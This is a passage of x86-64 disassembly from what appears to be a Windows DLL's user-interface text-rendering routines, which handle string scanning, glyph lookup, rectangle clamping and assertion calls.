   1800049f0:	48 8b 68 08          	mov    0x8(%rax),%rbp
   1800049f4:	f3 0f 10 70 10       	movss  0x10(%rax),%xmm6
   1800049f9:	7f 1a                	jg     0x180004a15
   1800049fb:	41 b8 02 05 00 00    	mov    $0x502,%r8d
   180004a01:	48 8d 15 48 cd 03 00 	lea    0x3cd48(%rip),%rdx        # 0x180041750
   180004a08:	48 8d 0d 61 f9 03 00 	lea    0x3f961(%rip),%rcx        # 0x180044370
   180004a0f:	ff 15 7b ca 03 00    	call   *0x3ca7b(%rip)        # 0x180041490
   180004a15:	48 63 57 70          	movslq 0x70(%rdi),%rdx
   180004a19:	48 8b 47 78          	mov    0x78(%rdi),%rax
   180004a1d:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   180004a21:	48 8b 44 d0 f8       	mov    -0x8(%rax,%rdx,8),%rax
   180004a26:	48 39 41 08          	cmp    %rax,0x8(%rcx)
   180004a2a:	74 1a                	je     0x180004a46
   180004a2c:	41 b8 85 04 00 00    	mov    $0x485,%r8d
   180004a32:	48 8d 15 77 41 04 00 	lea    0x44177(%rip),%rdx        # 0x180048bb0
   180004a39:	48 8d 0d 10 43 04 00 	lea    0x44310(%rip),%rcx        # 0x180048d50
   180004a40:	ff 15 4a ca 03 00    	call   *0x3ca4a(%rip)        # 0x180041490
   180004a46:	83 7f 60 00          	cmpl   $0x0,0x60(%rdi)
   180004a4a:	7f 1a                	jg     0x180004a66
   180004a4c:	41 b8 02 05 00 00    	mov    $0x502,%r8d
   180004a52:	48 8d 15 f7 cc 03 00 	lea    0x3ccf7(%rip),%rdx        # 0x180041750
   180004a59:	48 8d 0d 10 f9 03 00 	lea    0x3f910(%rip),%rcx        # 0x180044370
   180004a60:	ff 15 2a ca 03 00    	call   *0x3ca2a(%rip)        # 0x180041490
   180004a66:	48 8b 47 68          	mov    0x68(%rdi),%rax
   180004a6a:	66 49 0f 7e f9       	movq   %xmm7,%r9
   180004a6f:	48 63 4f 60          	movslq 0x60(%rdi),%rcx
   180004a73:	0f 28 d6             	movaps %xmm6,%xmm2
   180004a76:	c6 44 24 48 01       	movb   $0x1,0x48(%rsp)
   180004a7b:	48 03 c9             	add    %rcx,%rcx
   180004a7e:	f3 44 0f 11 44 24 40 	movss  %xmm8,0x40(%rsp)
   180004a85:	48 8b d7             	mov    %rdi,%rdx
   180004a88:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   180004a8d:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   180004a92:	0f 10 44 c8 f0       	movups -0x10(%rax,%rcx,8),%xmm0
   180004a97:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   180004a9c:	48 8b cd             	mov    %rbp,%rcx
   180004a9f:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180004aa4:	0f 11 44 24 60       	movups %xmm0,0x60(%rsp)
   180004aa9:	44 89 74 24 20       	mov    %r14d,0x20(%rsp)
   180004aae:	f3 0f 10 4c 24 68    	movss  0x68(%rsp),%xmm1
   180004ab4:	f3 41 0f 5f c1       	maxss  %xmm9,%xmm0
   180004ab9:	f3 41 0f 5d cb       	minss  %xmm11,%xmm1
   180004abe:	f3 0f 11 44 24 60    	movss  %xmm0,0x60(%rsp)
   180004ac4:	f3 0f 10 44 24 64    	movss  0x64(%rsp),%xmm0
   180004aca:	f3 41 0f 5f c2       	maxss  %xmm10,%xmm0
   180004acf:	f3 0f 11 4c 24 68    	movss  %xmm1,0x68(%rsp)
   180004ad5:	f3 0f 11 44 24 64    	movss  %xmm0,0x64(%rsp)
   180004adb:	f3 0f 10 44 24 6c    	movss  0x6c(%rsp),%xmm0
   180004ae1:	f3 41 0f 5d c4       	minss  %xmm12,%xmm0
   180004ae6:	f3 0f 11 44 24 6c    	movss  %xmm0,0x6c(%rsp)
   180004aec:	e8 2f 25 02 00       	call   0x180027020
   180004af1:	44 0f 28 9c 24 80 00 	movaps 0x80(%rsp),%xmm11
   180004af8:	00 00 
   180004afa:	44 0f 28 94 24 90 00 	movaps 0x90(%rsp),%xmm10
   180004b01:	00 00 
   180004b03:	44 0f 28 8c 24 a0 00 	movaps 0xa0(%rsp),%xmm9
   180004b0a:	00 00 
   180004b0c:	44 0f 28 64 24 70    	movaps 0x70(%rsp),%xmm12
   180004b12:	0f 28 b4 24 d0 00 00 	movaps 0xd0(%rsp),%xmm6
   180004b19:	00 
   180004b1a:	4c 8d 9c 24 e0 00 00 	lea    0xe0(%rsp),%r11
   180004b21:	00 
   180004b22:	49 8b 5b 20          	mov    0x20(%r11),%rbx
   180004b26:	49 8b 6b 30          	mov    0x30(%r11),%rbp
   180004b2a:	41 0f 28 7b e0       	movaps -0x20(%r11),%xmm7
   180004b2f:	45 0f 28 43 d0       	movaps -0x30(%r11),%xmm8
   180004b34:	49 8b e3             	mov    %r11,%rsp
   180004b37:	41 5e                	pop    %r14
   180004b39:	5f                   	pop    %rdi
   180004b3a:	5e                   	pop    %rsi
   180004b3b:	c3                   	ret
   180004b3c:	33 c9                	xor    %ecx,%ecx
   180004b3e:	e8 fd f0 ff ff       	call   0x180003c40
   180004b43:	44 8b f0             	mov    %eax,%r14d
   180004b46:	a9 00 00 00 ff       	test   $0xff000000,%eax
   180004b4b:	74 c5                	je     0x180004b12
   180004b4d:	48 85 f6             	test   %rsi,%rsi
   180004b50:	75 1d                	jne    0x180004b6f
   180004b52:	48 c7 c1 ff ff ff ff 	mov    $0xffffffffffffffff,%rcx
   180004b59:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180004b60:	80 7c 0b 01 00       	cmpb   $0x0,0x1(%rbx,%rcx,1)
   180004b65:	48 8d 49 01          	lea    0x1(%rcx),%rcx
   180004b69:	75 f5                	jne    0x180004b60
   180004b6b:	48 8d 34 19          	lea    (%rcx,%rbx,1),%rsi
   180004b6f:	48 3b de             	cmp    %rsi,%rbx
   180004b72:	74 9e                	je     0x180004b12
   180004b74:	83 7f 70 00          	cmpl   $0x0,0x70(%rdi)
   180004b78:	48 8b 47 38          	mov    0x38(%rdi),%rax
   180004b7c:	48 8b 68 08          	mov    0x8(%rax),%rbp
   180004b80:	f3 0f 10 70 10       	movss  0x10(%rax),%xmm6
   180004b85:	7f 1a                	jg     0x180004ba1
   180004b87:	41 b8 02 05 00 00    	mov    $0x502,%r8d
   180004b8d:	48 8d 15 bc cb 03 00 	lea    0x3cbbc(%rip),%rdx        # 0x180041750
   180004b94:	48 8d 0d d5 f7 03 00 	lea    0x3f7d5(%rip),%rcx        # 0x180044370
   180004b9b:	ff 15 ef c8 03 00    	call   *0x3c8ef(%rip)        # 0x180041490
   180004ba1:	48 63 57 70          	movslq 0x70(%rdi),%rdx
   180004ba5:	48 8b 47 78          	mov    0x78(%rdi),%rax
   180004ba9:	48 8b 4d 48          	mov    0x48(%rbp),%rcx
   180004bad:	48 8b 44 d0 f8       	mov    -0x8(%rax,%rdx,8),%rax
   180004bb2:	48 39 41 08          	cmp    %rax,0x8(%rcx)
   180004bb6:	74 1a                	je     0x180004bd2
   180004bb8:	41 b8 85 04 00 00    	mov    $0x485,%r8d
   180004bbe:	48 8d 15 eb 3f 04 00 	lea    0x43feb(%rip),%rdx        # 0x180048bb0
   180004bc5:	48 8d 0d 84 41 04 00 	lea    0x44184(%rip),%rcx        # 0x180048d50
   180004bcc:	ff 15 be c8 03 00    	call   *0x3c8be(%rip)        # 0x180041490
   180004bd2:	83 7f 60 00          	cmpl   $0x0,0x60(%rdi)
   180004bd6:	7f 1a                	jg     0x180004bf2
   180004bd8:	41 b8 02 05 00 00    	mov    $0x502,%r8d
   180004bde:	48 8d 15 6b cb 03 00 	lea    0x3cb6b(%rip),%rdx        # 0x180041750
   180004be5:	48 8d 0d 84 f7 03 00 	lea    0x3f784(%rip),%rcx        # 0x180044370
   180004bec:	ff 15 9e c8 03 00    	call   *0x3c89e(%rip)        # 0x180041490
   180004bf2:	48 8b 47 68          	mov    0x68(%rdi),%rax
   180004bf6:	66 49 0f 7e f9       	movq   %xmm7,%r9
   180004bfb:	48 63 57 60          	movslq 0x60(%rdi),%rdx
   180004bff:	0f 28 d6             	movaps %xmm6,%xmm2
   180004c02:	c6 44 24 48 00       	movb   $0x0,0x48(%rsp)
   180004c07:	48 03 d2             	add    %rdx,%rdx
   180004c0a:	f3 44 0f 11 44 24 40 	movss  %xmm8,0x40(%rsp)
   180004c11:	48 8b cd             	mov    %rbp,%rcx
   180004c14:	48 89 74 24 38       	mov    %rsi,0x38(%rsp)
   180004c19:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   180004c1e:	0f 10 44 d0 f0       	movups -0x10(%rax,%rdx,8),%xmm0
   180004c23:	48 8d 44 24 60       	lea    0x60(%rsp),%rax
   180004c28:	48 8b d7             	mov    %rdi,%rdx
   180004c2b:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180004c30:	0f 11 44 24 60       	movups %xmm0,0x60(%rsp)
   180004c35:	44 89 74 24 20       	mov    %r14d,0x20(%rsp)
   180004c3a:	e8 e1 23 02 00       	call   0x180027020
   180004c3f:	e9 ce fe ff ff       	jmp    0x180004b12
   180004c44:	cc                   	int3
   180004c45:	cc                   	int3
   180004c46:	cc                   	int3
   180004c47:	cc                   	int3
   180004c48:	cc                   	int3
   180004c49:	cc                   	int3
   180004c4a:	cc                   	int3
   180004c4b:	cc                   	int3
   180004c4c:	cc                   	int3
   180004c4d:	cc                   	int3
   180004c4e:	cc                   	int3
   180004c4f:	cc                   	int3
   180004c50:	40 56                	rex push %rsi
   180004c52:	57                   	push   %rdi
   180004c53:	41 56                	push   %r14
   180004c55:	48 83 ec 50          	sub    $0x50,%rsp
   180004c59:	4d 85 c9             	test   %r9,%r9
   180004c5c:	49 c7 c2 ff ff ff ff 	mov    $0xffffffffffffffff,%r10
   180004c63:	4d 8b f0             	mov    %r8,%r14
   180004c66:	48 8b f1             	mov    %rcx,%rsi
   180004c69:	4d 0f 45 d1          	cmovne %r9,%r10
   180004c6d:	49 8b f8             	mov    %r8,%rdi
   180004c70:	4d 3b c2             	cmp    %r10,%r8
   180004c73:	73 18                	jae    0x180004c8d
   180004c75:	0f b6 07             	movzbl (%rdi),%eax
   180004c78:	84 c0                	test   %al,%al
   180004c7a:	74 11                	je     0x180004c8d
   180004c7c:	3c 23                	cmp    $0x23,%al
   180004c7e:	75 05                	jne    0x180004c85
   180004c80:	38 47 01             	cmp    %al,0x1(%rdi)
   180004c83:	74 08                	je     0x180004c8d
   180004c85:	48 ff c7             	inc    %rdi
   180004c88:	49 3b fa             	cmp    %r10,%rdi
   180004c8b:	72 e8                	jb     0x180004c75
   180004c8d:	41 3b fe             	cmp    %r14d,%edi
   180004c90:	0f 84 d1 01 00 00    	je     0x180004e67
   180004c96:	48 8b 84 24 a0 00 00 	mov    0xa0(%rsp),%rax
   180004c9d:	00 
   180004c9e:	4c 8b c2             	mov    %rdx,%r8
   180004ca1:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   180004ca6:	4d 8b ce             	mov    %r14,%r9
   180004ca9:	48 8b 84 24 98 00 00 	mov    0x98(%rsp),%rax
   180004cb0:	00 
   180004cb1:	48 8b d6             	mov    %rsi,%rdx
   180004cb4:	48 89 44 24 30       	mov    %rax,0x30(%rsp)
   180004cb9:	48 8b 84 24 90 00 00 	mov    0x90(%rsp),%rax
   180004cc0:	00 
   180004cc1:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   180004cc6:	48 89 5c 24 70       	mov    %rbx,0x70(%rsp)
   180004ccb:	48 8b 1d fe 80 07 00 	mov    0x780fe(%rip),%rbx        # 0x18007cdd0
   180004cd2:	48 89 7c 24 20       	mov    %rdi,0x20(%rsp)
   180004cd7:	48 8b 8b 18 1a 00 00 	mov    0x1a18(%rbx),%rcx
   180004cde:	48 8b 89 a8 02 00 00 	mov    0x2a8(%rcx),%rcx
   180004ce5:	e8 86 fa ff ff       	call   0x180004770
   180004cea:	80 bb 30 2f 00 00 00 	cmpb   $0x0,0x2f30(%rbx)
   180004cf1:	0f 84 6b 01 00 00    	je     0x180004e62
   180004cf7:	48 89 6c 24 78       	mov    %rbp,0x78(%rsp)
   180004cfc:	48 8b 2d cd 80 07 00 	mov    0x780cd(%rip),%rbp        # 0x18007cdd0
   180004d03:	4c 89 64 24 48       	mov    %r12,0x48(%rsp)
   180004d08:	4c 8b a5 18 1a 00 00 	mov    0x1a18(%rbp),%r12
   180004d0f:	48 85 ff             	test   %rdi,%rdi
   180004d12:	75 29                	jne    0x180004d3d
   180004d14:	49 8b fe             	mov    %r14,%rdi
   180004d17:	49 83 fe ff          	cmp    $0xffffffffffffffff,%r14
   180004d1b:	73 20                	jae    0x180004d3d
   180004d1d:	0f 1f 00             	nopl   (%rax)
   180004d20:	0f b6 0f             	movzbl (%rdi),%ecx
   180004d23:	84 c9                	test   %cl,%cl
   180004d25:	74 16                	je     0x180004d3d
   180004d27:	48 8d 47 01          	lea    0x1(%rdi),%rax
   180004d2b:	80 f9 23             	cmp    $0x23,%cl
   180004d2e:	75 04                	jne    0x180004d34
   180004d30:	38 08                	cmp    %cl,(%rax)
   180004d32:	74 09                	je     0x180004d3d
   180004d34:	48 8b f8             	mov    %rax,%rdi
   180004d37:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   180004d3b:	72 e3                	jb     0x180004d20
   180004d3d:	4c 89 7c 24 40       	mov    %r15,0x40(%rsp)
   180004d42:	48 8d 46 04          	lea    0x4(%rsi),%rax
   180004d46:	48 85 f6             	test   %rsi,%rsi
   180004d49:	74 1e                	je     0x180004d69
   180004d4b:	f3 0f 10 8d 50 2f 00 	movss  0x2f50(%rbp),%xmm1
   180004d52:	00 
   180004d53:	f3 0f 58 0d a9 6d 04 	addss  0x46da9(%rip),%xmm1        # 0x18004bb04
   180004d5a:	00 
   180004d5b:	f3 0f 10 00          	movss  (%rax),%xmm0
   180004d5f:	0f 2f c1             	comiss %xmm1,%xmm0
   180004d62:	76 05                	jbe    0x180004d69
   180004d64:	41 b7 01             	mov    $0x1,%r15b
   180004d67:	eb 08                	jmp    0x180004d71
   180004d69:	45 32 ff             	xor    %r15b,%r15b
   180004d6c:	48 85 f6             	test   %rsi,%rsi
   180004d6f:	74 14                	je     0x180004d85
   180004d71:	8b 00                	mov    (%rax),%eax
   180004d73:	89 85 50 2f 00 00    	mov    %eax,0x2f50(%rbp)
   180004d79:	45 84 ff             	test   %r15b,%r15b
   180004d7c:	74 07                	je     0x180004d85
   180004d7e:	c6 85 54 2f 00 00 01 	movb   $0x1,0x2f54(%rbp)
   180004d85:	41 8b 84 24 08 01 00 	mov    0x108(%r12),%eax
   180004d8c:	00 
   180004d8d:	49 8b de             	mov    %r14,%rbx
   180004d90:	8b 8d 58 2f 00 00    	mov    0x2f58(%rbp),%ecx
   180004d96:	3b c8                	cmp    %eax,%ecx
   180004d98:	7e 08                	jle    0x180004da2
   180004d9a:	89 85 58 2f 00 00    	mov    %eax,0x2f58(%rbp)
   180004da0:	8b c8                	mov    %eax,%ecx
   180004da2:	45 8b a4 24 08 01 00 	mov    0x108(%r12),%r12d
   180004da9:	00 
   180004daa:	44 2b e1             	sub    %ecx,%r12d
   180004dad:	0f 1f 00             	nopl   (%rax)
   180004db0:	4c 8b c7             	mov    %rdi,%r8
   180004db3:	ba 0a 00 00 00       	mov    $0xa,%edx
   180004db8:	4c 2b c3             	sub    %rbx,%r8
   180004dbb:	48 8b cb             	mov    %rbx,%rcx
   180004dbe:	e8 7b af 03 00       	call   0x18003fd3e
   180004dc3:	48 85 c0             	test   %rax,%rax
   180004dc6:	48 8b f7             	mov    %rdi,%rsi
   180004dc9:	48 0f 45 f0          	cmovne %rax,%rsi
   180004dcd:	48 3b f7             	cmp    %rdi,%rsi
   180004dd0:	75 05                	jne    0x180004dd7
   180004dd2:	48 3b de             	cmp    %rsi,%rbx
   180004dd5:	74 6b                	je     0x180004e42
   180004dd7:	44 8b ce             	mov    %esi,%r9d
   180004dda:	44 2b cb             	sub    %ebx,%r9d
   180004ddd:	45 84 ff             	test   %r15b,%r15b
   180004de0:	75 2b                	jne    0x180004e0d
   180004de2:	49 3b de             	cmp    %r14,%rbx
   180004de5:	75 26                	jne    0x180004e0d
   180004de7:	44 38 bd 54 2f 00 00 	cmp    %r15b,0x2f54(%rbp)
   180004dee:	74 09                	je     0x180004df9
   180004df0:	48 8d 0d 11 f4 03 00 	lea    0x3f411(%rip),%rcx        # 0x180044208
   180004df7:	eb 1b                	jmp    0x180004e14
   180004df9:	4c 8b c3             	mov    %rbx,%r8
   180004dfc:	48 8d 0d 0d f4 03 00 	lea    0x3f40d(%rip),%rcx        # 0x180044210
   180004e03:	41 8b d1             	mov    %r9d,%edx
   180004e06:	e8 35 0b 01 00       	call   0x180015940
   180004e0b:	eb 20                	jmp    0x180004e2d
   180004e0d:	48 8d 0d e4 f3 03 00 	lea    0x3f3e4(%rip),%rcx        # 0x1800441f8
   180004e14:	4c 8d 05 77 cb 03 00 	lea    0x3cb77(%rip),%r8        # 0x180041992
   180004e1b:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   180004e20:	42 8d 14 a5 00 00 00 	lea    0x0(,%r12,4),%edx
   180004e27:	00 
   180004e28:	e8 13 0b 01 00       	call   0x180015940
   180004e2d:	c6 85 54 2f 00 00 00 	movb   $0x0,0x2f54(%rbp)
   180004e34:	48 3b f7             	cmp    %rdi,%rsi
   180004e37:	74 1a                	je     0x180004e53
   180004e39:	48 8d 5e 01          	lea    0x1(%rsi),%rbx
   180004e3d:	e9 6e ff ff ff       	jmp    0x180004db0
   180004e42:	45 84 ff             	test   %r15b,%r15b
   180004e45:	74 0c                	je     0x180004e53
   180004e47:	48 8d 0d ca f3 03 00 	lea    0x3f3ca(%rip),%rcx        # 0x180044218
   180004e4e:	e8 ed 0a 01 00       	call   0x180015940
   180004e53:	4c 8b 7c 24 40       	mov    0x40(%rsp),%r15
   180004e58:	48 8b 6c 24 78       	mov    0x78(%rsp),%rbp
   180004e5d:	4c 8b 64 24 48       	mov    0x48(%rsp),%r12
   180004e62:	48 8b 5c 24 70       	mov    0x70(%rsp),%rbx
   180004e67:	48 83 c4 50          	add    $0x50,%rsp
   180004e6b:	41 5e                	pop    %r14
   180004e6d:	5f                   	pop    %rdi
   180004e6e:	5e                   	pop    %rsi
   180004e6f:	c3                   	ret
   180004e70:	48 8b c4             	mov    %rsp,%rax
   180004e73:	4c 89 40 18          	mov    %r8,0x18(%rax)
   180004e77:	48 89 48 08          	mov    %rcx,0x8(%rax)
   180004e7b:	55                   	push   %rbp
   180004e7c:	53                   	push   %rbx
   180004e7d:	41 54                	push   %r12
   180004e7f:	41 55                	push   %r13
   180004e81:	48 8d 68 d8          	lea    -0x28(%rax),%rbp
   180004e85:	48 81 ec 08 01 00 00 	sub    $0x108,%rsp
   180004e8c:	4c 8b 65 58          	mov    0x58(%rbp),%r12
   180004e90:	4d 8b c8             	mov    %r8,%r9
   180004e93:	4c 8b 05 36 7f 07 00 	mov    0x77f36(%rip),%r8        # 0x18007cdd0
   180004e9a:	4c 8b ea             	mov    %rdx,%r13
   180004e9d:	48 89 78 d8          	mov    %rdi,-0x28(%rax)
   180004ea1:	49 8b dc             	mov    %r12,%rbx
   180004ea4:	44 0f 29 90 78 ff ff 	movaps %xmm10,-0x88(%rax)
   180004eab:	ff 
   180004eac:	44 0f 29 98 68 ff ff 	movaps %xmm11,-0x98(%rax)
   180004eb3:	ff 
   180004eb4:	44 0f 29 74 24 60    	movaps %xmm14,0x60(%rsp)
   180004eba:	44 0f 28 f3          	movaps %xmm3,%xmm14
   180004ebe:	4c 89 44 24 48       	mov    %r8,0x48(%rsp)
   180004ec3:	49 83 fc ff          	cmp    $0xffffffffffffffff,%r12
   180004ec7:	73 24                	jae    0x180004eed
   180004ec9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)
   180004ed0:	0f b6 13             	movzbl (%rbx),%edx
   180004ed3:	84 d2                	test   %dl,%dl
   180004ed5:	74 16                	je     0x180004eed
   180004ed7:	48 8d 43 01          	lea    0x1(%rbx),%rax
   180004edb:	80 fa 23             	cmp    $0x23,%dl
   180004ede:	75 04                	jne    0x180004ee4
   180004ee0:	38 10                	cmp    %dl,(%rax)
   180004ee2:	74 09                	je     0x180004eed
   180004ee4:	48 8b d8             	mov    %rax,%rbx
   180004ee7:	48 83 f8 ff          	cmp    $0xffffffffffffffff,%rax
   180004eeb:	72 e3                	jb     0x180004ed0
   180004eed:	48 8b 45 68          	mov    0x68(%rbp),%rax
   180004ef1:	33 ff                	xor    %edi,%edi
   180004ef3:	f3 44 0f 10 1d c8 6c 	movss  0x46cc8(%rip),%xmm11        # 0x18004bbc4
   180004efa:	04 00 
   180004efc:	45 0f 57 d2          	xorps  %xmm10,%xmm10
   180004f00:	48 85 c0             	test   %rax,%rax
   180004f03:	74 0b                	je     0x180004f10
   180004f05:	f2 0f 10 00          	movsd  (%rax),%xmm0
   180004f09:	f2 0f 11 45 68       	movsd  %xmm0,0x68(%rbp)
   180004f0e:	eb 71                	jmp    0x180004f81
   180004f10:	f3 41 0f 10 90 10 19 	movss  0x1910(%r8),%xmm2
   180004f17:	00 00 
   180004f19:	4c 3b e3             	cmp    %rbx,%r12
   180004f1c:	75 0a                	jne    0x180004f28
   180004f1e:	f3 0f 11 55 6c       	movss  %xmm2,0x6c(%rbp)
   180004f23:	89 7d 68             	mov    %edi,0x68(%rbp)
   180004f26:	eb 59                	jmp    0x180004f81
   180004f28:	49 8b 88 08 19 00 00 	mov    0x1908(%r8),%rcx
   180004f2f:	48 8d 55 38          	lea    0x38(%rbp),%rdx
   180004f33:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   180004f38:	41 0f 28 db          	movaps %xmm11,%xmm3
   180004f3c:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   180004f41:	4c 89 64 24 28       	mov    %r12,0x28(%rsp)
   180004f46:	f3 44 0f 11 54 24 20 	movss  %xmm10,0x20(%rsp)
   180004f4d:	e8 ae 1c 02 00       	call   0x180026c00
   180004f52:	f3 0f 10 45 38       	movss  0x38(%rbp),%xmm0
   180004f57:	f3 0f 58 05 a1 6b 04 	addss  0x46ba1(%rip),%xmm0        # 0x18004bb00
   180004f5e:	00 
   180004f5f:	f3 0f 10 4d 3c       	movss  0x3c(%rbp),%xmm1
   180004f64:	48 8b 4d 30          	mov    0x30(%rbp),%rcx
   180004f68:	4c 8b 4d 40          	mov    0x40(%rbp),%r9
   180004f6c:	f3 0f 11 4d 6c       	movss  %xmm1,0x6c(%rbp)
   180004f71:	f3 0f 2c c0          	cvttss2si %xmm0,%eax
   180004f75:	66 0f 6e c0          	movd   %eax,%xmm0
   180004f79:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
   180004f7c:	f3 0f 11 45 68       	movss  %xmm0,0x68(%rbp)
   180004f81:	f3 41 0f 10 19       	movss  (%r9),%xmm3
   180004f86:	48 8d 45 68          	lea    0x68(%rbp),%rax
   180004f8a:	f2 0f 10 08          	movsd  (%rax),%xmm1
   180004f8e:	0f 28 c3             	movaps %xmm3,%xmm0
   180004f91:	f3 41 0f 10 55 00    	movss  0x0(%r13),%xmm2
   180004f97:	48 89 b4 24 48 01 00 	mov    %rsi,0x148(%rsp)
   180004f9e:	00 
   180004f9f:	f3 0f 5c c2          	subss  %xmm2,%xmm0
   180004fa3:	4c 89 b4 24 f8 00 00 	mov    %r14,0xf8(%rsp)
   180004faa:	00 
   180004fab:	4c 89 bc 24 f0 00 00 	mov    %r15,0xf0(%rsp)
   180004fb2:	00 
   180004fb3:	0f 29 b4 24 e0 00 00 	movaps %xmm6,0xe0(%rsp)
   180004fba:	00 
   180004fbb:	0f 29 bc 24 d0 00 00 	movaps %xmm7,0xd0(%rsp)
   180004fc2:	00 
   180004fc3:	0f 2f c8             	comiss %xmm0,%xmm1
   180004fc6:	44 0f 29 84 24 c0 00 	movaps %xmm8,0xc0(%rsp)
   180004fcd:	00 00 
   180004fcf:	44 0f 29 8c 24 b0 00 	movaps %xmm9,0xb0(%rsp)
   180004fd6:	00 00 
   180004fd8:	44 0f 29 a4 24 80 00 	movaps %xmm12,0x80(%rsp)
   180004fdf:	00 00 
   180004fe1:	f2 0f 11 4c 24 40    	movsd  %xmm1,0x40(%rsp)
   180004fe7:	0f 86 69 02 00 00    	jbe    0x180005256
   180004fed:	48 8b 41 38          	mov    0x38(%rcx),%rax
   180004ff1:	41 b9 ff ff 00 00    	mov    $0xffff,%r9d
   180004ff7:	44 0f 29 6c 24 70    	movaps %xmm13,0x70(%rsp)
   180004ffd:	48 89 7d 60          	mov    %rdi,0x60(%rbp)
   180005001:	4c 8b 78 08          	mov    0x8(%rax),%r15
   180005005:	f3 44 0f 10 48 10    	movss  0x10(%rax),%xmm9
   18000500b:	41 0f b7 57 5c       	movzwl 0x5c(%r15),%edx
   180005010:	0f b7 f2             	movzwl %dx,%esi
   180005013:	89 75 38             	mov    %esi,0x38(%rbp)
   180005016:	66 41 3b d1          	cmp    %r9w,%dx
   18000501a:	75 08                	jne    0x180005024
   18000501c:	be 2e 00 00 00       	mov    $0x2e,%esi
   180005021:	89 75 38             	mov    %esi,0x38(%rbp)
   180005024:	b8 01 00 00 00       	mov    $0x1,%eax
   180005029:	b9 03 00 00 00       	mov    $0x3,%ecx
   18000502e:	0f 45 c8             	cmovne %eax,%ecx
   180005031:	0f b7 c6             	movzwl %si,%eax
   180005034:	89 4d 68             	mov    %ecx,0x68(%rbp)
   180005037:	41 3b 47 18          	cmp    0x18(%r15),%eax
   18000503b:	7c 06                	jl     0x180005043
   18000503d:	49 8b 47 38          	mov    0x38(%r15),%rax
   180005041:	eb 27                	jmp    0x18000506a
   180005043:	49 8b 47 20          	mov    0x20(%r15),%rax
   180005047:	0f b7 ce             	movzwl %si,%ecx
   18000504a:	44 0f b7 04 48       	movzwl (%rax,%rcx,2),%r8d
   18000504f:	66 45 3b c1          	cmp    %r9w,%r8w
   180005053:	75 06                	jne    0x18000505b
   180005055:	49 8b 47 38          	mov    0x38(%r15),%rax
   180005059:	eb 0c                	jmp    0x180005067
   18000505b:	49 8b 47 30          	mov    0x30(%r15),%rax
   18000505f:	4b 8d 0c 80          	lea    (%r8,%r8,4),%rcx
   180005063:	48 8d 04 c8          	lea    (%rax,%rcx,8),%rax
   180005067:	8b 4d 68             	mov    0x68(%rbp),%ecx
   18000506a:	f3 44 0f 10 40 10    	movss  0x10(%rax),%xmm8
   180005070:	41 0f 28 f0          	movaps %xmm8,%xmm6
   180005074:	66 41 3b d1          	cmp    %r9w,%dx
   180005078:	75 25                	jne    0x18000509f
   18000507a:	f3 44 0f 5c 40 08    	subss  0x8(%rax),%xmm8
   180005080:	41 0f 28 c1          	movaps %xmm9,%xmm0
   180005084:	66 0f 6e f1          	movd   %ecx,%xmm6
   180005088:	f3 41 0f 5e 47 14    	divss  0x14(%r15),%xmm0
   18000508e:	0f 5b f6             	cvtdq2ps %xmm6,%xmm6
   180005091:	f3 44 0f 58 c0       	addss  %xmm0,%xmm8
   180005096:	f3 41 0f 59 f0       	mulss  %xmm8,%xmm6
   18000509b:	f3 0f 5c f0          	subss  %xmm0,%xmm6
   18000509f:	f3 44 0f 10 6d 50    	movss  0x50(%rbp),%xmm13
   1800050a5:	48 8d 45 60          	lea    0x60(%rbp),%rax
   1800050a9:	f3 44 0f 10 25 52 6a 	movss  0x46a52(%rip),%xmm12        # 0x18004bb04
   1800050b0:	04 00 
   1800050b2:	f3 41 0f 5f dd       	maxss  %xmm13,%xmm3
   1800050b7:	48 89 44 24 38       	mov    %rax,0x38(%rsp)
   1800050bc:	48 8d 54 24 50       	lea    0x50(%rsp),%rdx
   1800050c1:	48 89 5c 24 30       	mov    %rbx,0x30(%rsp)
   1800050c6:	49 8b cf             	mov    %r15,%rcx
   1800050c9:	4c 89 64 24 28       	mov    %r12,0x28(%rsp)
   1800050ce:	f3 44 0f 11 54 24 20 	movss  %xmm10,0x20(%rsp)
   1800050d5:	f3 0f 5c de          	subss  %xmm6,%xmm3
   1800050d9:	f3 0f 5c da          	subss  %xmm2,%xmm3
   1800050dd:	41 0f 28 d1          	movaps %xmm9,%xmm2
   1800050e1:	f3 41 0f 5f dc       	maxss  %xmm12,%xmm3
   1800050e6:	e8 15 1b 02 00       	call   0x180026c00
   1800050eb:	4c 8b 75 60          	mov    0x60(%rbp),%r14
   1800050ef:	f3 0f 10 38          	movss  (%rax),%xmm7
   1800050f3:	4d 3b f4             	cmp    %r12,%r14
   1800050f6:	75 4b                	jne    0x180005143
   1800050f8:	4c 3b f3             	cmp    %rbx,%r14
   1800050fb:	73 43                	jae    0x180005140
   1800050fd:	4c 8b c3             	mov    %rbx,%r8
   180005100:	48 8d 4d 60          	lea    0x60(%rbp),%rcx
   180005104:	49 8b d4             	mov    %r12,%rdx
   180005107:	e8 64 e7 ff ff       	call   0x180003870
   18000510c:	48 89 7c 24 38       	mov    %rdi,0x38(%rsp)
   180005111:	48 8d 55 60          	lea    0x60(%rbp),%rdx
   180005115:	4c 63 f0             	movslq %eax,%r14
   180005118:	41 0f 28 db          	movaps %xmm11,%xmm3
   18000511c:	4d 03 f4             	add    %r12,%r14
   18000511f:	41 0f 28 d1          	movaps %xmm9,%xmm2
   180005123:	4c 89 74 24 30       	mov    %r14,0x30(%rsp)
   180005128:	49 8b cf             	mov    %r15,%rcx
   18000512b:	4c 89 64 24 28       	mov    %r12,0x28(%rsp)
   180005130:	f3 44 0f 11 54 24 20 	movss  %xmm10,0x20(%rsp)
   180005137:	e8 c4 1a 02 00       	call   0x180026c00
   18000513c:	f3 0f 10 38          	movss  (%rax),%xmm7
   180005140:	4d 3b f4             	cmp    %r12,%r14
